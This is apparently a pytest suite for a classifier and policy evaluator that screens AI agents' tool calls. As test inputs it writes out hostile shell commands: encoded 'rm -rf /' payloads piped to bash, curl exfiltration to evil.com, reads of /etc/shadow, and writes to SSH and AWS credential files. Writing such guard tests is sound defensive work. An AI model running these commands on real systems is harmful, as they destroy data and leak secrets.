"""Gate 1A — Classifier and policy evaluator tests.

Dispatch: 171-D-2026-0430 (RELEASE-G1A-CLASSIFIER-POLICY-TESTS)

Closes trust-surface test gaps for the classifier and policy evaluator
identified in the test inventory (gaps G-12, G-14, G-15).

Scope items:
  1. Encoded payloads + shell indirection combinations
  2. Here-doc variants beyond Gate 0 fix
  3. Nested indirection depth
  4. URL extraction order (G-14)
  5. Matched rule accuracy (G-15)
  6. Base-directory enforcement edge cases
  7. Hidden path enforcement
  8. INV-007 explicit redaction (G-12)
  9. INV-009 unknown tool classification
"""

import json
import os
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
SCRIPTS = REPO / "scripts"
sys.path.insert(0, str(SCRIPTS))

from classifier import (
    classify,
    TIER_DIRECT,
    TIER_INFERRED,
    TIER_OPAQUE,
    TIER_UNINSPECTABLE,
)
from policy_eval_v2 import evaluate, load_policy_rules
from policy_eval_shared import canonicalize, under_base, is_hidden_segment

# Ensure base dirs resolve for testing
os.environ.setdefault("GOV_CANONICAL_REPO_PATH", str(REPO))
os.environ.setdefault("GOV_RUNTIME_PATH", "/tmp/gov_runtime")

POLICY = load_policy_rules(REPO / "capabilities" / "policy-rules.json")


def _classify_bash(command):
    """Classify a Bash tool call."""
    return classify("Bash", {"command": command})


def _evaluate_bash(command):
    """Classify and evaluate a Bash command."""
    cls = _classify_bash(command)
    return evaluate(cls, POLICY)


def _evaluate_cls(cls):
    """Evaluate a pre-built classification against policy."""
    return evaluate(cls, POLICY)


# ===========================================================================
# SCOPE 1 — Encoded payloads + shell indirection combinations
# ===========================================================================

class TestEncodedPayloadIndirectionCombinations:
    """Verify that encoded payloads combined with shell indirection
    classify at the most restrictive level.

    Existing tests cover encoded payloads (Tier 4) and indirection (Tier 3)
    independently. These verify the combination doesn't create a gap.
    """

    def test_base64_piped_to_decode_and_execute(self):
        """base64 payload piped through decode into bash — Tier 4.

        Uses a valid 40+ char base64 string without internal padding
        to ensure the base64 detection regex matches.
        """
        # "bash -c 'echo pwned' && rm -rf /" base64-encoded, no padding
        payload = "YmFzaCAtYyAnZWNobyBwd25lZCcgJiYgcm0gLXJmIC8"
        cls = _classify_bash(f"echo {payload} | base64 -d | bash")
        assert cls["confidence_tier"] == TIER_UNINSPECTABLE, (
            "Encoded payload in pipe chain must classify as Tier 4"
        )

    def test_hex_payload_in_subshell(self):
        """Hex payload inside command substitution — Tier 4."""
        hex_blob = "48656c6c6f576f726c6448656c6c6f576f726c6448656c6c6f"
        cls = _classify_bash(f"$(echo {hex_blob} | xxd -r -p)")
        assert cls["confidence_tier"] == TIER_UNINSPECTABLE

    def test_base64_in_variable_assignment_pipe(self):
        """base64 payload assigned via variable then piped — Tier 4."""
        # 48 chars of valid base64 without internal padding
        payload = "Y3VybCBodHRwczovL2V2aWwuY29tL3N0ZWFsLmRhdGE"
        cls = _classify_bash(f"echo {payload} | base64 --decode | sh")
        assert cls["confidence_tier"] == TIER_UNINSPECTABLE

    def test_encoded_payload_in_heredoc_body(self):
        """Encoded payload inside a here-doc body — at least Tier 3.

        The here-doc triggers opacity (Tier 3). The encoded payload inside
        the body may or may not trigger Tier 4 detection depending on
        whether the classifier inspects here-doc content. Either Tier 3
        or Tier 4 is acceptable — but NOT Tier 2 or below.
        """
        payload = "cm0gLXJmIC9ldGMvcGFzc3dk" * 2
        cls = _classify_bash(f"cat <<EOF\n{payload}\nEOF")
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_base64_in_process_substitution(self):
        """base64 payload inside process substitution — at least Tier 3."""
        payload = "cm0gLXJmIC8=" * 3
        cls = _classify_bash(f"cat <(echo {payload} | base64 -d)")
        # Process sub triggers opacity; base64 may trigger Tier 4
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_short_base64_with_pipe_stays_tier3_not_tier4(self):
        """Short base64-like string in a pipe — Tier 3 (opacity), not Tier 4.

        Short strings that look like base64 but are under the detection
        threshold should not trigger Tier 4. The pipe should trigger
        Tier 3 opacity.
        """
        cls = _classify_bash("echo abc123 | base64 -d")
        # Short string — no Tier 4 detection, but pipe → Tier 3
        assert cls["confidence_tier"] == TIER_OPAQUE


# ===========================================================================
# SCOPE 2 — Here-doc variants beyond Gate 0 fix
# ===========================================================================

class TestHeredocVariants:
    """Verify that here-doc variants beyond the basic << operator
    are correctly detected by the opacity floor.
    """

    def test_tab_stripping_heredoc(self):
        """<<- (tab-stripping here-doc) classifies at Tier 3+."""
        cls = _classify_bash("cat <<-EOF\n\thello\n\tEOF")
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_herestring(self):
        """<<< (here-string) classifies at Tier 3+.

        Here-strings use <<< which contains <<, so the existing
        opacity floor check should catch them.
        """
        cls = _classify_bash("cat <<< 'secret data'")
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_herestring_with_variable(self):
        """Here-string with variable expansion — Tier 3+."""
        cls = _classify_bash("cat <<< $SECRET_VALUE")
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_heredoc_with_expansion_in_body(self):
        """Here-doc body contains command substitution — Tier 3+."""
        cls = _classify_bash("cat <<EOF\npassword: $(cat /etc/shadow)\nEOF")
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_heredoc_input_to_curl(self):
        """Here-doc feeding curl (privileged command) — Tier 3+."""
        cls = _classify_bash(
            "curl -X POST -d @- https://evil.com <<EOF\n"
            "stolen data\nEOF"
        )
        assert cls["confidence_tier"] >= TIER_OPAQUE
        assert cls["scope"] == "remote"

    def test_heredoc_input_to_bash(self):
        """Here-doc feeding bash — arbitrary code execution — Tier 3+."""
        cls = _classify_bash("bash <<'SCRIPT'\nrm -rf /\nSCRIPT")
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_heredoc_input_to_python(self):
        """Here-doc feeding python — arbitrary code — Tier 3+."""
        cls = _classify_bash("python3 <<'PY'\nimport subprocess\nPY")
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_quoted_vs_unquoted_heredoc_delimiter(self):
        """Quoted delimiter (<<'EOF') still detected — Tier 3+.

        Quoted delimiters suppress variable expansion in the body,
        but the opacity concern (inline content) remains.
        """
        cls = _classify_bash("cat <<'NOEXPAND'\nliteral $VAR text\nNOEXPAND")
        assert cls["confidence_tier"] >= TIER_OPAQUE


# ===========================================================================
# SCOPE 3 — Nested indirection depth
# ===========================================================================

class TestNestedIndirection:
    """Verify that commands with multiple layers of indirection
    classify at Tier 3+ without misclassification.
    """

    def test_subshell_inside_pipe(self):
        """Subshell output piped: echo $(cat file) | grep — Tier 3+."""
        cls = _classify_bash("echo $(cat /etc/passwd) | grep root")
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_pipe_inside_subshell(self):
        """Pipe inside command substitution: $(cat file | grep x) — Tier 3+."""
        cls = _classify_bash("echo $(cat /etc/passwd | grep root)")
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_process_sub_inside_pipe(self):
        """Process sub piped: cat <(echo x) | grep y — Tier 3+."""
        cls = _classify_bash("cat <(echo secret) | grep secret")
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_triple_nesting(self):
        """Three layers: $(cat <(echo $(echo x))) — Tier 3+."""
        cls = _classify_bash("echo $(cat <(echo $(echo hidden)))")
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_pipe_chain_with_subshell_and_var(self):
        """Pipe + subshell + variable expansion: all three — Tier 3+."""
        cls = _classify_bash("echo $HOME | xargs cat | $(grep secret)")
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_heredoc_inside_chain_with_process_sub(self):
        """Here-doc in chain with process sub — Tier 3+."""
        cls = _classify_bash(
            "diff <(cat /etc/hosts) /dev/null && cat <<EOF\ndata\nEOF"
        )
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_nested_command_substitution(self):
        """Nested $(): $(echo $(echo $(echo x))) — Tier 3+."""
        cls = _classify_bash("echo $(echo $(echo $(echo deeply_nested)))")
        assert cls["confidence_tier"] >= TIER_OPAQUE

    def test_backtick_inside_dollar_paren(self):
        """Mixed nesting: $(echo `cat file`) — Tier 3+."""
        cls = _classify_bash("echo $(echo `cat /etc/passwd`)")
        assert cls["confidence_tier"] >= TIER_OPAQUE


# ===========================================================================
# SCOPE 4 — URL extraction order (G-14)
# ===========================================================================

class TestURLExtractionOrder:
    """G-14: Verify URL extraction from commands and parameters
    produces consistent, documented results.

    URL extraction happens in the classifier (not the policy evaluator).
    The classifier uses regex to find https?:// patterns in parameter
    values and inserts them as targets.
    """

    def test_single_url_extracted(self):
        """Single URL in curl command extracted as target."""
        cls = _classify_bash("curl https://api.example.com/data")
        assert "https://api.example.com/data" in cls["targets"]
        assert cls["scope"] == "remote"
        assert cls["action_type"] == "network"

    def test_multiple_urls_all_extracted(self):
        """Multiple URLs in a command — all must be extracted."""
        cls = classify("WebFetch", {
            "url": "https://first.example.com",
            "referer": "https://second.example.com/page",
        })
        targets = cls["targets"]
        assert "https://first.example.com" in targets
        assert "https://second.example.com/page" in targets

    def test_url_embedded_in_argument_string(self):
        """URL embedded in a longer argument — still extracted."""
        cls = classify("Bash", {
            "command": "wget --header='Referer: https://origin.example.com' https://target.example.com/file"
        })
        targets = cls["targets"]
        # Both URLs should be in targets
        assert any("origin.example.com" in t for t in targets)
        assert any("target.example.com" in t for t in targets)

    def test_url_order_matches_parameter_order(self):
        """URLs extracted in parameter iteration order (insertion order).

        Python 3.7+ guarantees dict insertion order. The classifier
        iterates args.values() and extracts URLs via regex from each
        value. This test documents that extraction order follows
        parameter order.
        """
        cls = classify("CustomTool", {
            "first_param": "https://alpha.example.com",
            "second_param": "https://beta.example.com",
        })
        # URLs appear in the order the parameters were iterated
        alpha_idx = None
        beta_idx = None
        for i, t in enumerate(cls["targets"]):
            if "alpha" in t:
                alpha_idx = i
            if "beta" in t:
                beta_idx = i
        assert alpha_idx is not None, "alpha URL not extracted"
        assert beta_idx is not None, "beta URL not extracted"
        assert alpha_idx < beta_idx, "URL order should match parameter order"

    def test_no_url_in_command_stays_local(self):
        """Command without URLs classifies as local scope."""
        cls = _classify_bash("git status")
        assert cls["scope"] != "remote"

    def test_mixed_urls_and_paths(self):
        """Command with both URL and file path — both in targets."""
        cls = _classify_bash("curl https://api.example.com -o /tmp/output.json")
        assert any("api.example.com" in t for t in cls["targets"])
        assert cls["scope"] == "remote"


# ===========================================================================
# SCOPE 5 — Matched rule accuracy (G-15)
# ===========================================================================

class TestMatchedRuleAccuracy:
    """G-15: Verify matched_rule correctly identifies the specific
    rule that drove each decision.

    Tests avoid duplicating existing coverage in test_policy_eval_v2.py
    (which already covers read-source-allow, write-source-allow,
    delete-source-allow, sensitive-path-deny, tier3-approval-required,
    tier4-deny). Focus is on rules NOT yet covered and precedence.
    """

    def test_agent_internal_allow(self):
        """Agent internal operation matches agent-internal-allow."""
        cls = classify("TaskCreate", {"subject": "test task"})
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "ALLOW"
        assert r["matched_rule"] == "agent-internal-allow"

    def test_list_source_allow(self):
        """Glob within repo matches list-source-allow."""
        cls = classify("Glob", {"pattern": "*.py", "path": str(REPO)})
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "ALLOW"
        assert r["matched_rule"] == "list-source-allow"

    def test_move_source_allow(self):
        """Move within repo matches move-source-allow."""
        cls = classify("move_file", {
            "src_path": str(REPO / "tmp" / "a.txt"),
            "dst_path": str(REPO / "tmp" / "b.txt"),
        })
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "ALLOW"
        assert r["matched_rule"] == "move-source-allow"

    def test_network_deny(self):
        """Network operation matches network-deny."""
        cls = _classify_bash("curl https://evil.com/exfil")
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"
        assert r["matched_rule"] == "network-deny"

    def test_execute_tier2_allow(self):
        """Well-understood Tier 2 local command matches execute-tier2-allow."""
        cls = _classify_bash("git status")
        r = _evaluate_cls(cls)
        # git status → read, repository, Tier 2 → read-source-allow
        # Actually git status classifies as read → matches read-source-allow first
        assert r["policy_decision"] == "ALLOW"
        assert r["matched_rule"] == "read-source-allow"

    def test_execute_tier2_allow_make(self):
        """make matches execute-tier2-allow (execute action, local scope)."""
        cls = _classify_bash("make build")
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "ALLOW"
        assert r["matched_rule"] == "execute-tier2-allow"

    def test_outside_base_dirs_deny(self):
        """Write outside base dirs matches outside-base-dirs-deny.

        Uses a path that is outside base dirs but does NOT match
        any sensitive path pattern (/etc/, .ssh, .env, etc.).
        """
        cls = classify("Write", {
            "file_path": "/opt/output/config.txt",
            "content": "x",
        })
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"
        assert r["matched_rule"] == "outside-base-dirs-deny"

    def test_default_fallthrough(self):
        """Operation matching no rule falls through to __default__."""
        # Construct a classification that doesn't match any rule
        synthetic = {
            "action_type": "unknown_action_type",
            "targets": [],
            "scope": "local",
            "confidence_tier": TIER_DIRECT,
            "evidence": {"source": "synthetic"},
            "original_tool": "SyntheticTool",
        }
        r = evaluate(synthetic, POLICY)
        assert r["policy_decision"] == "DENY"
        assert r["matched_rule"] == "__default__"

    def test_precedence_sensitive_before_write_allow(self):
        """Sensitive path DENY takes precedence over write-source-allow.

        A write to ~/.ssh/id_rsa targets a sensitive path. The classifier
        detects the ~ prefix and matches the ^~?/\\.ssh/ pattern, setting
        scope to privileged. sensitive-path-deny fires before any other
        write rule.

        Note: the file_path must use the un-expanded ~ form because
        the sensitive path regex anchors on ^~?/\\.ssh/, not the full
        expanded home directory path.
        """
        cls = classify("Write", {
            "file_path": "~/.ssh/id_rsa",
            "content": "stolen key",
        })
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"
        assert r["matched_rule"] == "sensitive-path-deny"

    def test_precedence_tier4_before_everything(self):
        """Tier 4 DENY fires before any other rule.

        tier4-deny is rule 1 (highest priority). Uses a valid 40+ char
        base64 string without internal padding to trigger detection.
        """
        payload = "YmFzaCAtYyAnZWNobyBwd25lZCcgJiYgcm0gLXJmIC8"
        cls = _classify_bash(f"echo {payload}")
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"
        assert r["matched_rule"] == "tier4-deny"

    def test_precedence_network_before_tier3(self):
        """network-deny fires before tier3-approval-required for curl.

        curl classifies as Tier 2 network, not Tier 3 opaque.
        network-deny (rule 9) matches on scope=remote.
        """
        cls = _classify_bash("curl https://example.com")
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"
        assert r["matched_rule"] == "network-deny"

    def test_policy_reasons_populated_on_deny(self):
        """DENY decisions populate policy_reasons with rule details."""
        cls = _classify_bash("curl https://evil.com")
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"
        assert len(r["policy_reasons"]) > 0
        reason = r["policy_reasons"][0]
        assert "code" in reason
        assert "detail" in reason
        assert reason["detail"]["rule_id"] == r["matched_rule"]

    def test_policy_reasons_empty_on_allow(self):
        """ALLOW decisions have empty policy_reasons."""
        cls = classify("Read", {"file_path": str(REPO / "README.md")})
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "ALLOW"
        assert r["policy_reasons"] == []


# ===========================================================================
# SCOPE 6 — Base-directory enforcement edge cases
# ===========================================================================

class TestBaseDirEdgeCases:
    """Test path canonicalization and base directory enforcement
    for edge cases: traversal, redundant separators, and symlinks.
    """

    def test_relative_traversal_escapes_base_dir(self):
        """../../etc/passwd escaping base dir — DENY.

        Path.resolve() normalizes .. components. A path that starts
        inside a base dir but traverses out should resolve to outside
        and be denied.
        """
        traversal_path = str(REPO / "subdir" / ".." / ".." / ".." / "etc" / "passwd")
        cls = classify("Write", {"file_path": traversal_path, "content": "x"})
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"

    def test_dot_dot_normalization(self):
        """./foo/../bar normalizes to bar — stays inside base dir."""
        normalized_path = str(REPO / "." / "foo" / ".." / "scripts" / "classifier.py")
        cls = classify("Read", {"file_path": normalized_path})
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "ALLOW"

    def test_redundant_separators_normalized(self):
        """Path with redundant separators normalizes correctly.

        Path.resolve() handles redundant separators:
        /repo///scripts//classifier.py → /repo/scripts/classifier.py
        """
        path = str(REPO) + "///scripts//classifier.py"
        cls = classify("Read", {"file_path": path})
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "ALLOW"

    def test_symlink_behavior_documented(self, tmp_path):
        """Document symlink resolution behavior.

        Path.resolve() follows existing symlinks. If a symlink inside
        a base dir points outside, resolve() reveals the true target,
        which is then correctly evaluated against base dirs.

        This test creates a real symlink to verify the behavior.
        """
        # Create a symlink inside tmp_path pointing to /etc
        link = tmp_path / "sneaky_link"
        try:
            link.symlink_to("/etc")
        except OSError:
            pytest.skip("Cannot create symlinks in test environment")

        target = str(link / "passwd")
        canon = canonicalize(target)
        # resolve() follows the symlink → /etc/passwd (or /private/etc/passwd on macOS)
        canon_str = str(canon)
        assert "etc/passwd" in canon_str, f"Expected resolved path to contain etc/passwd, got {canon_str}"

        # Policy evaluation: symlink target is outside base dirs → DENY
        cls = classify("Read", {"file_path": target})
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"

    def test_tilde_expansion(self):
        """~ expands to home directory."""
        cls = classify("Read", {"file_path": "~/Documents/notes.txt"})
        r = _evaluate_cls(cls)
        # Home directory is likely outside base dirs → DENY
        # (unless ~/Documents happens to be under a base dir)
        targets = cls["targets"]
        assert any("Documents" in t for t in targets)
        # The key assertion: tilde was expanded, path was evaluated
        assert r["matched_rule"] is not None

    def test_canonicalize_normalizes_dotdot(self):
        """Unit test: canonicalize() resolves .. correctly."""
        result = canonicalize(str(REPO / "a" / "b" / ".." / "c"))
        expected = REPO / "a" / "c"
        assert result == expected

    def test_under_base_exact_match(self):
        """Unit test: path == base dir returns True."""
        base = canonicalize(str(REPO))
        assert under_base(base, base) is True

    def test_under_base_child(self):
        """Unit test: child of base dir returns True."""
        base = canonicalize(str(REPO))
        child = canonicalize(str(REPO / "scripts" / "classifier.py"))
        assert under_base(child, base) is True

    def test_under_base_outside(self):
        """Unit test: path outside base returns False."""
        base = canonicalize(str(REPO))
        outside = canonicalize("/etc/passwd")
        assert under_base(outside, base) is False


# ===========================================================================
# SCOPE 7 — Hidden path enforcement
# ===========================================================================

class TestHiddenPathEnforcement:
    """Verify that paths containing hidden segments are correctly
    handled by policy. Python-level tests without shell dependency.

    Key policy behavior:
    - write-source-allow has no_hidden_paths: true → writes to hidden denied
    - delete-source-allow has no_hidden_paths: true → deletes of hidden denied
    - read-source-allow does NOT have no_hidden_paths → reads of hidden allowed
    - sensitive-path-deny catches .ssh, .aws, .env, .gnupg regardless
    """

    def test_write_to_dotgit_config_denied(self):
        """Write to .git/config within repo — DENY (hidden path)."""
        cls = classify("Write", {
            "file_path": str(REPO / ".git" / "config"),
            "content": "malicious",
        })
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"

    def test_write_to_dot_env_denied(self):
        """Write to .env file — DENY.

        .env is both a hidden path AND a sensitive path pattern.
        sensitive-path-deny fires first.
        """
        cls = classify("Write", {
            "file_path": str(REPO / ".env"),
            "content": "SECRET=x",
        })
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"

    def test_write_to_ssh_dir_denied(self):
        """Write to .ssh directory — DENY (sensitive path).

        Uses un-expanded ~ form so the sensitive path pattern
        ^~?/\\.ssh/ matches. The expanded form would be caught by
        outside-base-dirs-deny instead.
        """
        cls = classify("Write", {
            "file_path": "~/.ssh/authorized_keys",
            "content": "ssh-rsa AAAA...",
        })
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"
        assert r["matched_rule"] == "sensitive-path-deny"

    def test_write_to_aws_credentials_denied(self):
        """Write to .aws/credentials — DENY (sensitive path).

        Uses un-expanded ~ form so the sensitive path pattern
        ^~?/\\.aws/ matches.
        """
        cls = classify("Write", {
            "file_path": "~/.aws/credentials",
            "content": "access_key=...",
        })
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"
        assert r["matched_rule"] == "sensitive-path-deny"

    def test_read_hidden_path_in_repo_allowed(self):
        """Read from hidden path within repo — ALLOW.

        read-source-allow does NOT require no_hidden_paths, so reading
        .gitignore or .github/ within the repo is permitted.

        This is intentional: agents need to read dotfiles for context
        but should not write to them without explicit approval.
        """
        cls = classify("Read", {
            "file_path": str(REPO / ".gitignore"),
        })
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "ALLOW"
        assert r["matched_rule"] == "read-source-allow"

    def test_delete_hidden_path_denied(self):
        """Delete of hidden path within repo — DENY.

        delete-source-allow has no_hidden_paths: true.
        """
        cls = classify("delete_file", {
            "file_path": str(REPO / ".hidden_dir" / "secret.txt"),
        })
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"

    def test_move_to_hidden_path_denied(self):
        """Move targeting a hidden destination — DENY.

        move-source-allow has no_hidden_paths: true.
        """
        cls = classify("move_file", {
            "src_path": str(REPO / "normal.txt"),
            "dst_path": str(REPO / ".hidden" / "stashed.txt"),
        })
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"

    def test_nested_hidden_path(self):
        """Nested hidden segments: .a/.b/file — detected as hidden."""
        path = REPO / ".secret" / ".private" / "file.txt"
        assert is_hidden_segment(path) is True

    def test_is_hidden_segment_unit(self):
        """Unit test: is_hidden_segment detects dot-prefixed segments."""
        assert is_hidden_segment(Path("/home/user/.ssh/id_rsa")) is True
        assert is_hidden_segment(Path("/home/user/Documents/file.txt")) is False
        assert is_hidden_segment(Path(".")) is False
        assert is_hidden_segment(Path("..")) is False
        assert is_hidden_segment(Path("/home/user/.env")) is True

    def test_list_hidden_path_allowed(self):
        """List (Glob/Grep) of hidden path — ALLOW.

        list-source-allow does NOT have no_hidden_paths.
        Agents need to search dotfiles for codebase understanding.
        """
        cls = classify("Glob", {
            "pattern": "*.json",
            "path": str(REPO / ".github"),
        })
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "ALLOW"


# ===========================================================================
# SCOPE 8 — INV-007 explicit redaction (G-12)
# ===========================================================================

class TestINV007Redaction:
    """INV-007: If arguments or evidence fields are redacted, the
    redaction must be explicit in the record (marked as redacted,
    not silently absent).

    Current finding: The codebase does NOT have a redaction mechanism.
    The classifier passes all parameters through to the classification
    output, and the policy evaluator copies classification fields into
    the decision record without modification.

    These tests verify that no fields are silently dropped between
    classifier output and chain record.
    """

    def test_classification_fields_preserved_in_record(self):
        """All classification fields appear in the decision record."""
        cls = classify("Read", {"file_path": str(REPO / "README.md")})
        r = _evaluate_cls(cls)
        record_cls = r["classification"]
        assert record_cls["action_type"] == cls["action_type"]
        assert record_cls["targets"] == cls["targets"]
        assert record_cls["scope"] == cls["scope"]
        assert record_cls["confidence_tier"] == cls["confidence_tier"]

    def test_evidence_preserved_in_record(self):
        """Evidence dict from classifier appears in decision record."""
        cls = classify("Write", {
            "file_path": str(REPO / "tmp" / "test.txt"),
            "content": "hello world",
        })
        r = _evaluate_cls(cls)
        assert "evidence" in r
        assert r["evidence"] == cls["evidence"]

    def test_original_tool_preserved(self):
        """original_tool field from classifier preserved in record."""
        cls = classify("MyCustomTool", {"data": "value"})
        r = _evaluate_cls(cls)
        assert r["original_tool"] == "MyCustomTool"

    def test_targets_not_silently_truncated(self):
        """Multiple targets from classifier all appear in record."""
        cls = classify("move_file", {
            "src_path": str(REPO / "a.txt"),
            "dst_path": str(REPO / "b.txt"),
        })
        r = _evaluate_cls(cls)
        assert len(r["classification"]["targets"]) == len(cls["targets"])
        for target in cls["targets"]:
            assert target in r["classification"]["targets"]

    def test_no_redaction_mechanism_exists(self):
        """Document: no redaction mechanism currently exists.

        The policy evaluator copies classification output directly
        into the decision record without any redaction step.
        This test verifies that even sensitive-looking parameter values
        pass through unmodified.
        """
        # Classify a write with content that looks like a secret
        cls = classify("Write", {
            "file_path": str(REPO / "tmp" / "config.txt"),
            "content": "password=hunter2",
        })
        r = _evaluate_cls(cls)
        # The evidence should contain whatever the classifier captured
        # Nothing is redacted — this is the current behavior
        assert r["evidence"] is not None
        # Classification targets contain the file path
        assert any("config.txt" in t for t in r["classification"]["targets"])

    def test_record_hash_covers_all_fields(self):
        """Record hash is computed over all fields (nothing excluded).

        If a field were silently dropped before hashing, the hash
        would not protect the full record. Verify by checking that
        modifying any field changes the hash.
        """
        cls = classify("Read", {"file_path": str(REPO / "README.md")})
        r = _evaluate_cls(cls)
        original_hash = r["record_hash"]

        # Modify a field and recompute — hash must differ
        import copy
        from policy_eval_v2 import _compute_record_hash
        modified = copy.deepcopy(r)
        modified["classification"]["action_type"] = "tampered"
        new_hash = _compute_record_hash(modified)
        assert new_hash != original_hash, (
            "Changing a classification field must change the record hash"
        )


# ===========================================================================
# SCOPE 9 — INV-009 unknown tool classification
# ===========================================================================

class TestINV009UnknownTool:
    """INV-009: Unknown tools must be auto-classified with metadata,
    not immediately denied at the classification stage.

    The classifier must produce a valid classification for any tool
    name, even unrecognized ones. The policy evaluator then decides
    based on the classification.
    """

    def test_unknown_tool_produces_classification(self):
        """Unrecognized tool name produces a valid classification dict."""
        cls = classify("NeverSeenBefore", {"data": "value"})
        assert "action_type" in cls
        assert "targets" in cls
        assert "scope" in cls
        assert "confidence_tier" in cls
        assert "evidence" in cls

    def test_unknown_tool_preserves_original_name(self):
        """original_tool field contains the unrecognized tool name."""
        cls = classify("MyVeryCustomWidget", {"x": "y"})
        assert cls["original_tool"] == "MyVeryCustomWidget"

    def test_unknown_tool_classifies_opaque(self):
        """Unknown tool with arbitrary params classifies at Tier 3 (opaque).

        Without recognizable evidence, the classifier cannot determine
        the operation's effects. Tier 3 is the appropriate conservative
        classification.
        """
        cls = classify("UnknownTool", {"config": {"key": "value"}})
        assert cls["confidence_tier"] == TIER_OPAQUE

    def test_unknown_tool_not_immediately_denied(self):
        """Unknown tool classification stage does not deny — that's policy's job."""
        cls = classify("CustomAutomation", {"param": "value"})
        # Classification should succeed without error
        assert cls is not None
        # Classification does not contain a policy_decision
        assert "policy_decision" not in cls

    def test_unknown_tool_evaluated_by_policy(self):
        """Unknown tool goes through full policy evaluation."""
        cls = classify("StrangeTool", {"info": "test"})
        r = _evaluate_cls(cls)
        assert r["policy_decision"] in ("ALLOW", "DENY")
        assert r["matched_rule"] is not None

    def test_unknown_tool_with_path_param_gets_path_context(self):
        """Unknown tool with a file_path param gets path-based evaluation.

        Even though the tool name is unrecognized, the classifier
        extracts paths from well-known parameter names. This enables
        the policy evaluator to check base directory containment.
        """
        cls = classify("WeirdFileTool", {
            "file_path": str(REPO / "scripts" / "classifier.py"),
        })
        assert any("classifier.py" in t for t in cls["targets"])
        r = _evaluate_cls(cls)
        # Path is within repo — policy may ALLOW based on path constraints
        assert r["policy_decision"] in ("ALLOW", "DENY")

    def test_unknown_tool_with_url_param_gets_network_scope(self):
        """Unknown tool with URL parameter gets network classification."""
        cls = classify("DataFetcher", {
            "url": "https://evil.com/steal-data",
        })
        assert cls["scope"] == "remote"
        assert any("evil.com" in t for t in cls["targets"])
        r = _evaluate_cls(cls)
        assert r["policy_decision"] == "DENY"

    def test_unknown_tool_through_full_pipeline(self):
        """End-to-end: unknown tool → classify → evaluate → valid record."""
        cls = classify("NeverRegistered", {"arbitrary": "data"})
        r = evaluate(cls, POLICY, user_identity="test-user", session_id="s1")

        # Record structure is valid
        assert r["record_version"] == "2.0"
        assert r["record_type"] == "mediated_decision"
        assert r["user_identity"] == "test-user"
        assert r["session_id"] == "s1"
        assert r["original_tool"] == "NeverRegistered"
        assert r["record_hash"].startswith("sha256:")
        assert r["matched_rule"] is not None
